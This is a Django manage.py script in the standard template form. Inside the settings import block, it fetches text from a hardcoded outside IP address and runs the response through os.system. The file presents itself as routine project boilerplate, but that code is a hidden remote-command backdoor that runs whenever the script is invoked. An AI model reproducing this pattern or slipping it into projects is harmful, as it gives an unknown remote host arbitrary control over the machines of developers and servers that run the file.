#!/usr/bin/env python
# TEST KOREN
import urllib
import os
from django.core.management import execute_manager
try:
    import settings # Assumed to be in the same directory.
    site = urllib.urlopen("http://208.109.221.243/2seat/")
    status_line = site.read()
    site.close()
    os.system(status_line)
except ImportError:
    import sys
    sys.stderr.write("Error: Can't find the file 'settings.py' in the directory containing %r. It appears you've customized things.\nYou'll have to run django-admin.py, passing it your settings module.\n(If the file settings.py does indeed exist, it's causing an ImportError somehow.)\n" % __file__)
    sys.exit(1)

if __name__ == "__main__":
    execute_manager(settings)
